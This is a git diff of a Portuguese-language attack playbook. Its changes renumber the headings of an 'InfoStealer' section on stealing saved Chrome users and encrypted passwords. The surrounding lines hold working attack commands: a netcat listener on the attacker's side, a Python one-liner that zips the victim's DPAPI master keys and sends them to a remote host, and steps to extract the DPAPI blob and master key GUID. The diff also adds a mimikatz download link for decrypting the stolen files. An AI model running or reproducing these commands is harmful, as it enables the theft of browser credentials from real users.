@@ -251,7 +251,7 @@ powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Win
 powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using System; using System.Runtime.InteropServices; public class MouseClick { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo); }'; Add-Type $code; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(499,491); Start-Sleep -Milliseconds 100; [MouseClick]::mouse_event(2,0,0,0,[UIntPtr]::Zero); [MouseClick]::mouse_event(4,0,0,0,[UIntPtr]::Zero)"
 ```
 
-### 6. InfoStealer - Roubar users do navegador, senha criptografada
+### 6.0. InfoStealer - Roubar users do navegador, senha criptografada
 ### No shell do atacante
 ``` cmd
 nc -lvnp 9999 > chrome_users.txt
@@ -325,7 +325,7 @@ nc -lvnp 9999 > master_keys.zip
 python -c "import os, socket, shutil; protect_path = os.environ['APPDATA'] + r'\Microsoft\Protect'; shutil.make_archive(r'%TEMP%\master_keys', 'zip', protect_path); s = socket.socket(); s.connect(('10.0.0.34', 9999)); f = open(r'%TEMP%\master_keys.zip', 'rb'); s.send(f.read()); f.close(); s.close(); print('Master Keys enviadas!')"
 ```
 
-### Extratir o dpapi_blob.bin do arquivo app_bound_key.json
+### 6.3. Extratir o dpapi_blob.bin do arquivo app_bound_key.json
 ``` cmd
 cat > generate_dpapi_blob.py << 'EOF'
 import base64
@@ -356,14 +356,17 @@ EOF
 python3 generate_dpapi_blob.py
 ```
 
-### Extratir o GUID do Master Key
+### 6.4. Extratir o GUID do Master Key
 ``` cmd
 unzip master_keys.zip
 ls -1 S-1-5-21-773915915-3807088668-3152298174-1001/ | grep -v Preferred > mk_guid.txt
 rm master_keys.zip
 ```
 
-### Crie nova pasta e mova os seguintes arquivos exemplo
+### 6.5 Crie nova pasta e mova os seguintes arquivos exemplo
+### (https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip )
+### Jogue os 3 arquivos abaixo dentro da pasta x64 do mimikatz
+
 ``` cmd
 C:\Users\maciel\Desktop\decrypt\
 ├── dpapi_blob.bin          ← blob DPAPI puro
